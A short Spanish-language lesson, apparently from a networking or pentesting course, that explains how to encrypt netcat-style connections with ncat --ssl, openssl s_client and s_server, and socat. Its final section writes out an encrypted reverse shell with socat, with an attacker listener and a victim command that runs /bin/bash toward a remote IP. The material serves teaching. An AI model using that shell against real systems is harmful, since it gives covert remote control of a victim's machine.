Uso de conexiones encriptadas

Duración: 2:55 · Sección 2: Temario

Las conexiones con netcat tradicional van en texto plano. Cualquiera en la red intermedia puede capturar el tráfico con tcpdump o Wireshark y leer los datos. Para evitarlo, necesitamos cifrar la comunicación.

ncat: Netcat con SSL

ncat es la versión moderna incluida con Nmap. Soporta cifrado SSL/TLS nativo, a diferencia del netcat tradicional.

# Servidor con SSL (genera certificado temporal)
ncat --ssl -lvnp 4444

# Cliente con SSL
ncat --ssl -nv 192.168.1.100 4444

# Usar un certificado propio
ncat --ssl --ssl-cert server.crt --ssl-key server.key -lvnp 4444
🔒 Diferencia clave: nc tradicional no cifra. ncat --ssl añade una capa TLS completa. Para instalarlo en Ubuntu: sudo apt install ncat. Viene incluido con nmap.

OpenSSL s_client como cliente

Incluso sin ncat, podemos usar openssl s_client para establecer conexiones TLS contra cualquier servidor que soporte SSL.

# Conectarse a un servidor HTTPS
openssl s_client -connect google.com:443

# Servidor con SSL usando openssl (en lugar de ncat)
openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 365
openssl s_server -key key.pem -cert cert.pem -accept 4444

# Cliente conectándose
openssl s_client -connect 192.168.1.100:4444

Socat: El todoterreno

socat es como netcat con esteroides. Permite conectar todo tipo de sockets (TCP, UDP, UNIX, SSL) y transformar datos sobre la marcha.

# Transferencia de archivos cifrada con socat
# Receptor:
socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0,fork FILE:recibido.zip

# Emisor:
socat OPENSSL-CONNECT:192.168.1.100:4444,verify=0 FILE:enviar.zip

# Reverse shell cifrada con socat
# Atacante:
socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0,fork STDOUT
# Víctima:
socat OPENSSL-CONNECT:192.168.1.100:4444,verify=0 EXEC:/bin/bash
⚠️ Diferencia crítica: Conexión raw (nc) vs cifrada (ncat --ssl, socat OPENSSL). Con raw, cualquier persona con acceso a la red puede ver el tráfico con tcpdump. Con cifrado, aunque capturen los paquetes, no podrán leer el contenido sin la clave.
